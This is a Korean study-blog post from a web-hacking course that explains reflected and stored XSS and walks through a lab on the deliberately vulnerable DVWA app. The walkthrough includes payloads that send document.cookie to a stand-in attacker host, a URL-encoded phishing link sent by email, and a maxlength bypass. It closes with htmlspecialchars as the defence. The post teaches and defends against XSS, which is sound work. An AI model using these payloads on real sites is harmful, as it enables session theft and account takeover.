---
title:  '[강의] 6주차 웹 해킹- 웹 해킹 기술 탐색 5'
excerpt: "week6"

categories:
  - study
  - etc
  - hacking
tags: [study, etc, virtualbox, kalilinux, hacking]

last_modified_at: 2021-07-31T08:06:00-05:00
classes: wide
--- 

### 8주간의 해킹 스터디 다섯번째 시간

6주차 스터디😽😽😽

강의링크는 오른쪽! => [goormedu](https://edu.goorm.io/lecture/4953/화이트해커가-되기-위한-8가지-웹-해킹-기술)

<br>

이번 시간은 스크립트 코드 삽입을 통해 개발자가 고려하지 않은 기능이 작동하게 하는 치명적인 공격인 **크로스사이트스트리밍(XSS) 공격**에 대해 알아보겠습니다. 

<hr>

### XSS 공격

XSS공격에 대해 알아보기 전 XSS에서 사용하는 언어인 **자바스트립트 언어**에 대해서 알아보도록 합니다 🙋🏽!!

#### - 자바스크립트 (JS)

웹어플리케이션에서 사용되는 언어 HTML과 자바스크립트로 이루어져있음

> HTML : 텍스트, 이미지 등 정적인 내용 표시
> 
> 자바스크립트 : 동적인 기능을 구현 ( ex) 마우스를 가져가면 메뉴의 색이 변하는 것 )

JS 사용 방법!
~~~
<script>  script code    </script>
~~~ 


#### XSS 공격이란?

클라이언트 쪽의 웹브라우저를 공격하는 기법이다. 

만약 어떤 웹브라우저 기능이 입력값을 그대로 출력하는 것이라면, <script>와 같은 입력값이 그대로 웹페이지에 표시되면 위험하다. 
  
해커는 이 자바스크립트를 이용해 세션 쿠키를 알아내 탈취하게 되는 것이다.

#### XSS공격 2가지
> 1. reflected XSS
>
> 2. stored XSS
  
<br>
  
#### 1. Reflected XSS 공격
 
reflected는 script를 반사하기 때문에 붙여진 이름이다. 공격 순서를 알아보도록 한다.

먼저 해커가 한 사용자에게 이메일 등으로 피싱을 한다.
  
![1](https://user-images.githubusercontent.com/53431568/127724126-1218ea01-9dec-4acc-89d2-931aaaed49aa.PNG)

<br>
  
이때, 사용자가 피싱에 속아 클릭을 하게 되면 스크립트 코드가 삽입된 요청이 전송된다.
  
![2](https://user-images.githubusercontent.com/53431568/127724129-3d0a9ede-6cea-426b-8886-a526547ca6ad.PNG)

<br>
  
웹 어플리케이션은 스크립트 코드를 반사시켜 그대로 되돌려준다. 이렇게 되면 웹 브라우저는 스크립트를 실행하게 되고 얻어낸 쿠키를 해커에게 전달하게 된다.

![3](https://user-images.githubusercontent.com/53431568/127724134-af31a433-2e05-479d-8d6a-18a293cd9062.PNG)

<br>

해커가 얻어낸 세션 쿠키를 사용되면 해당 사용자의 계정으로 접속할 수 있게 된다.
  
![4](https://user-images.githubusercontent.com/53431568/127724131-8e03fa4f-29b5-49f3-88fc-a93cbb1da238.PNG)

  
  
#### 2. Stored XSS 공격

script코드가 한 번 저장되었다가 나중에 실행되는 공격!
  
먼저, 해커가 피싱을 하는 것이 아니라 서버의 게시판이나 방명록 같은 곳에 스크립트 코드를 남긴다.
  
![image](https://user-images.githubusercontent.com/53431568/127724500-9e13c762-5561-4e5f-9621-20b171b958b1.png)

<br>

이후 사용자가 방명록에 접속해 글을 읽게 되면 글을 읽은 사용자에게 스크립트 코드가 실행된다.

![image](https://user-images.githubusercontent.com/53431568/127724518-56784bb0-41e9-4ef1-8160-fccd2e574f91.png)

<br>
  
이 이후는 reflected XSS 공격과 같이 쿠키값이 해커에게 전달되고 해커는 해당 사용자의 계정으로 접속할 수 있게 된다.

![image](https://user-images.githubusercontent.com/53431568/127724536-c2e840d8-a148-470f-8a89-56f7bc683d8c.png)

 
### XSS 공격 실습 🚀
#### 1. Reflected XSS

먼저, `low`단계에서 실습! XSS(Reflected) 메뉴로 가면 다음과 같이 이름을 입력하는 웹브라우져가 실행된다.

![image](https://user-images.githubusercontent.com/53431568/127726951-17cb7939-486a-4efc-9275-4fcf6591b1fa.png)

이름을 입력하니 입력한 값이 다시 리턴되는 것을 볼 수 있다.

![image](https://user-images.githubusercontent.com/53431568/127727006-15841c20-3608-4aee-9286-1eb2a12449a1.png)

XSS 취약점을 찾기 위한 가장 간단한 방법은 script 태그를 입력폼에다 입력하는 것이다! 
  
`<script>alert(1)</script>`  명령어를 입력하니 다음과 같이 알림창이 뜨는 것을 확인하였다!! 이를 통해서 해커는 reflected xss 공격이 가능하다는 것을 파악하게 된다.  

![image](https://user-images.githubusercontent.com/53431568/127727055-81d832b0-9b44-4dbd-9ee4-3b72247a8a09.png)

이번에는 쿠키값을 알아보자!
  
`<script>alert(document.cookie)</script>` 입력하니 쿠키의 값이 출력되었다. 

![image](https://user-images.githubusercontent.com/53431568/127727115-08e82497-fe2e-4317-9d21-c1948b7314a4.png)


<br><br>

이번에는 알아낸 쿠키값을 해커가 관리하는 시스템과 같은 다른 시스템에 전달해보자!!!

먼저 터미널을 켜고 `tail -f /opt/lampp/logs/acess_log` 명령어를 통해 해커 호스트의 웹서버의 로그가 출력되는 것을 확인하고, 이후 발생하는 로그도 계속 확인하도록 한다.

![image](https://user-images.githubusercontent.com/53431568/127727168-3cb70cb9-fe82-42fa-8bea-0cdee6504cb0.png)

다음으로  `<script>document.location='http://127.0.0.1/cookie?'+document.cookie</script>` 명령어를 reflected xss의 입력창에 입력해준다.

> 명령어를 해석하면, document.loaction은 뒤에 나오는 127.0.0.1 인 (지금 해커사이트라고 가정하는 주소)에 리다이렉트를 시켜주며, document.cookie 명령어를 이용해 cookie값을 찍어오게 된다.

아래 이미지를 보니, 입력한 후 터미널에 쿠키값이 넘겨진 것을 확인할 수 있다.  
  
![image](https://user-images.githubusercontent.com/53431568/127727310-fb7ec7ab-6814-40ce-b007-454e63ddb0da.png)
  

  <br>
  <br>
  
  
그런데 드는 의문이.. 개발자도 아니고 어떤 사용자가  <script></script> 를 직접 입력하려나..?! 😅😅😅

따라서 해커는 피싱을 이용해서 사용자가 자기도 모르는 새에 걸려들도록 한다고 한다! ㅎㅎ 그렇다면 간단한 피싱용 메일을 만들어보자!

처음과 같이 이름을 입력하고 이번에는 주소창을 주목! 파라미터 값으로 이름이 전달되는 것을 확인할 수 있다. 이름과 #을 제외한 주소를 복사하자! ctrl + v!  
  
  ![image](https://user-images.githubusercontent.com/53431568/127727435-ccef162e-0164-427b-9614-02ab7cc07f10.png)

  <br>  
  
  이제 피싱링크를 넣을 건데 아까 복사한 주소 뒤에 다음 명령어를 붙여준다. `<script>document.location%3D'http://127.0.0.1/cookie%3F'%2Bdocument.cookie</script>`
  
  뭔가 이상함을 감지했나요?! ㅎㅎ `= , ? , + ' 라는 문자들이 '%3F, %3F, %2B` 로 인코딩되었습니다. 이 이유는  gmail에서 링크를 삽입할때는 url인코딩 기법을 이용해서 인코딩을 거쳐야 하기 때문입니다.!!  주의주의~ 😊😊
  
  
  최종적으로 입력해야할 링크 코드는 다음과 같다.
  
  ~~~javascript
  http://localhost/dvwa/vulnerabilities/xss_r/?name=<script>document.location%3D'http://127.0.0.1/cookie%3F'%2Bdocument.cookie</script>
  ~~~
  
![image](https://user-images.githubusercontent.com/53431568/127727655-9fdc0205-7917-450e-85bf-41ddbfbe517a.png)

위와 같이 했다면 이메일을 보내고 체크! 내가 보낸 메일을 열고 링크를 클릭하니 아까와 같이 터미널 창에 쿠키값이 전달되는 것을 확인할 수 있었다.

![image](https://user-images.githubusercontent.com/53431568/127727771-cec42aa0-36b8-482e-b8fa-6c518d4eb2d4.png)

<br><br>
  
#### 2. Stored XSS
  
이 공격은 해커가 스크립트 코드를 서버에 직접 삽입해 웹 페이지 자체에서 실행된다. 때문에 해당 페이지를 방문하는 모든 사용자가 위험에 노출되는 무서운 공격이다.

dvwa의 Stored XSS 메뉴로 들어가면 방명록을 작성하는 것과 같은 페이지를 보게되는데 이때, 테스트 텍스트를 넣어보자! 나는 다음과 같이 아까 사용한  `<script>document.location='http://127.0.0.1/cookie?'+document.cookie</script>` 코드를 입력하니 뒤에 글자 제한 때문에 코드가 잘린 것을 볼 수 있었다. 
  
![image](https://user-images.githubusercontent.com/53431568/127727913-e7cf860b-e476-4070-877c-c26deb1f8fc5.png)

이런 글자 수 제한은 간단히 우회할 수 있는데.. 입력창에서 마우스 오른쪽 클릭을 한 후 `inspect element`를 보면 아래에 창이 뜬다. 자세히 보면 maxlength 라는 파라미터가 있는데 이 값을 변경해 주면된다.!


나는 50-> 500으로 넉넉히 변경해주었다. 이제 입력이 가능하다! 

![image](https://user-images.githubusercontent.com/53431568/127727995-1e97c99b-6f2e-4f22-8dbc-626dbbb56fbb.png)

방명록에 입력후 버튼을 누르자 마자 바로 스크립트가 실행된다. 이는, 이 글이 있는 방명록 페이지에 접속하자 마자 스크립트가 실행되는 것이다. 

![image](https://user-images.githubusercontent.com/53431568/127728071-7b2d8eb7-32f2-4e72-88ba-6f3e3647a88a.png)

터미널을 확인하니 페이지에 방문하기만 해도 쿠키값이 넘어가는 것을 확인할 수 있었다.

![image](https://user-images.githubusercontent.com/53431568/127728104-96a029ea-da93-4bb9-8d4d-0a828d2fe204.png)

이런식으로 해커는 하나의 공격으로 다수의 사용자들을 공격할 수 있게 된다. 

<br><br>
  
### XSS 공격 대응 👨‍🏫

impossible 단계의 소스코드를 보면서 알아보자
  
![image](https://user-images.githubusercontent.com/53431568/127728266-50c4bf64-d38b-4f00-b04d-5fae57d83e74.png)
  
소스코드를 보니 `htmlspecialchars` 라는 함수를 사용하는데 이 함수는 몇몇 함수를 html entity 라는 것으로 변경하는 함수이다.
  
이를 통해서 페이지 상에서는 script 코드가 그냥 들어간 것 같지만 뒤에서는 이 코드를 **`다른 문자로 변경하여 실제로 코드 실행을 방지`**할 수 있게 한다.

실제로 restored reflect 페이지에서 `<script>document.location='http://127.0.0.1/cookie?'+document.cookie</script>`를 submit 한 수, 페이지 빈 공간에서 
오른쪽 클릭을 한 후 View source를 확인해보면..
  
  ![image](https://user-images.githubusercontent.com/53431568/127728429-ed9e35a5-4165-4455-86bf-556184084438.png)

  다음과 같이 몇몇 문자가 다른 문자로 바뀐 것을 확인할 수 있다! (`&lt` 와 같은 전혀 다른 일을 수행하는 명령어로 교체됨)

  ![image](https://user-images.githubusercontent.com/53431568/127728396-832a08f1-2f16-42b9-a171-9d9b9e493f67.png)

  
  
#### 이미지 출처
  
[https://edu.goorm.io/lecture/4953/화이트해커가-되기-위한-8가지-웹-해킹-기술](https://edu.goorm.io/lecture/4953/화이트해커가-되기-위한-8가지-웹-해킹-기술)
  
  
  
